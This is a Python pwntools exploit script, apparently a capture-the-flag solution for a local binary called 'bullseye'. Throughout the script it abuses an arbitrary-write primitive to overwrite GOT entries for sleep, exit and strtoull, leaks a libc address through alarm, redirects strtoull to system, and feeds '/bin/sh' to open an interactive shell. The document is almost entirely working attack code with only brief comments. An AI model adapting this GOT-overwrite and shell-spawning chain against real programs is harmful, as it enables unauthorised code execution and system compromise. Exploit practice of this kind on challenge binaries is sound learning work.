#!/usr/bin/python3
from pwn import *
import os
context(terminal = ['tmux', 'new-window'], os = 'linux', arch = 'amd64')

#init objects
e = ELF('./bullseye')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')  #local libc
p = process('./bullseye')

#gdb.attach(p)

def overwrite(location, overwrite):
    p.readuntil('write to?\n')
    p.sendline(hex(location))
    p.recvuntil('to write?\n')
    p.sendline(hex(overwrite))

#patch out sleep
overwrite(e.symbols['got.sleep'], e.symbols['main'])

#first run overwrite exit with main to give us unlimited write primitative shots
overwrite(e.symbols['got.exit'], e.symbols['main'])

#patch out sleep to ret so we continue to leak
overwrite(e.symbols['got.sleep'], 4198426)

#recv and convert leak
leak_str = p.recv(14)
leak = int(leak_str,16)    #convert type to usable
l.address = leak - l.symbols['alarm']
print('Leaked address of alarm: {}'.format(hex(leak)))
print('Leaked address of libc: {}'.format(hex(l.address)))

#rewrite strtoull@plt to call system
overwrite(e.symbols['got.strtoull'], l.symbols['system'])

#place '\bin\sh0x00' so that it gets placed in rdi before call to system
p.readuntil('write to?\n')
p.sendline('/bin/sh\x00')

p.interactive()